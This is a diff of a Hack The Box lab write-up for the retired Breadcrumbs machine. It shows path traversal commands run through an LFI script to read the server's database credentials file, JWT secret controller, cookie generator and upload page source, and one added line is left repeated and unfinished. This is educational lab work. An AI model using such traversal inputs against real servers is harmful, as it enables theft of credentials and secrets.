@@ -15,7 +15,7 @@ data = {'book':sys.argv[1],'method':'1'}
 r = requests.post(url, data=data,cookies=cookies)
 print(bytes(r.text,"utf-8").decode('unicode_escape').strip('"'))
 ```
-Like this we can get php code of db.php
+Like this we can get php code of /db/db.php, which sql database credentials.
 ```bash
 ~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../db/db.php
 ```
@@ -31,11 +31,9 @@ $dbname="bread";
 $con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
 ?>
 ```
-Also  of log
+Also of /portal/login.php which is login page. 
 ```bash
 ~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../portal/login.php
-/home/kali/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired/lfi.py:13: DeprecationWarning: invalid escape sequence '\/'
-  print(bytes(r.text,"utf-8").decode('unicode_escape').strip('"'))
 ```
 ```php
 <?php
@@ -94,10 +92,9 @@ require_once 'authController.php';
 <\/body>
 <\/html>
 ```
+Also of /portal/authcontroller.php which contains secret for JWT token
 ```bash
 ~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../portal/authcontroller.php
-/home/kali/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired/lfi.py:13: DeprecationWarning: invalid escape sequence '\/'
-  print(bytes(r.text,"utf-8").decode('unicode_escape').strip('"'))
 ```
 ```php
 <?php
@@ -225,10 +222,9 @@ if($_SERVER['REQUEST_METHOD'] === "POST"){
     }
 }
 ```
+Also of /portal/cookie.php which method for generating cookie.
 ```bash
 ~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../portal/cookie.php
-/home/kali/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired/lfi.py:13: DeprecationWarning: invalid escape sequence '\/'
-  print(bytes(r.text,"utf-8").decode('unicode_escape').strip('"'))
 ```
 ```php
 <?php
@@ -249,4 +245,79 @@ function makesession($username){
 
     return $session_cookie;
 }
+```
+Also of /portal/php/files.php/portal/php/files.php/portal/php/files.php which 
+```bash
+~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../portal/php/files.php
+```
+```php
+<?php session_start();
+$LOGGED_IN = false;
+if($_SESSION['username'] !== "paul"){
+    header("Location: ..\/index.php");
+}
+if(isset($_SESSION['loggedIn'])){
+    $LOGGED_IN = true;
+    require '..\/db\/db.php';
+}
+else{
+    header("Location: ..\/auth\/login.php");
+    die();
+}
+?>
+<html lang="en">
+    <head>
+        <title>Binary<\/title>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm" crossorigin="anonymous">
+        <script src="https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js"><\/script>
+        <link rel="stylesheet" type="text\/css" href="..\/assets\/css\/main.css">
+        <link rel="stylesheet" type="text\/css" href="..\/assets\/css\/all.css">
+    <\/head>
+
+    <nav class="navbar navbar-default justify-content-end">
+        <div class="navbar-header justify-content-end">
+            <button type="button" class="navbar-toggle btn btn-outline-info p-3 m-3" data-toggle="collapse" data-target=".navbar-collapse"><i class="fas fa-hamburger"><\/i><\/button>
+        <\/div>
+
+        <div class="collapse navbar-collapse justify-content-end mr-5">
+             <ul class="navbar-nav">
+                <li class="nav-item"><a class="nav-link text-right" href="..\/index.php"><i class="fas fa-home"><\/i> Home<\/a><\/li>
+                <li class="nav-item"><a class="nav-link text-right" href="issues.php"><i class="fa fa-check" aria-hidden="true"><\/i> Issues<\/a><\/li>
+                <li class="nav-item"><a class="nav-link text-right" href="users.php"><i class="fa fa-user" aria-hidden="true"><\/i> User Management<\/a><\/li>
+                <li class="nav-item"><a class="nav-link text-right" href="#"><i class="fa fa-file" aria-hidden="true"><\/i> File Management<\/a><\/li>
+                <li class="nav-item"><a class="nav-link text-right" href="..\/auth\/logout.php"><i class="fas fa-sign-out-alt"><\/i> Logout<\/a><\/li>
+             <\/ul>
+        <\/div>
+    <\/nav>
+    <body class="bg-dark">
+        <main class="main">
+            <div class="row justify-content-center text-white text-center">
+                <div class="col-md-3">
+                    <h1>Task Submission<\/h1>
+                    <p class="text-danger"><i class="fas fa-exclamation-circle"><\/i> Please upload only .zip files!<\/p>
+                    <form onsubmit="return false">
+                        <div class="form-group mt-5">
+                            <input type="text" class="form-control" placeholder="Task completed" id="task" name="task">
+                        <\/div>
+                        <div class="form-group">
+                            <input type="file" class="form-control" placeholder="Task" id="file" name="file">
+                        <\/div>
+                        <button type="submit" class="btn btn-outline-success btn-block py-3" id="upload">Upload<\/button>
+                    <\/form>
+                    <p id="message"><\/p>
+                <\/div>
+            <\/div>
+        <\/div>
+        <\/main>
+
+        <?php include "..\/includes\/footer.php"; ?>
+        <script src="https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@4.5.3\/dist\/js\/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ\/JpcUGGOn+Y7RsweNrtN\/tE3MoK7ZeZDyx" crossorigin="anonymous"><\/script>
+        <script type="text\/javascript" src='..\/assets\/js\/files.js'><\/script>
+    <\/body>
+
+
+<\/html>
 ```
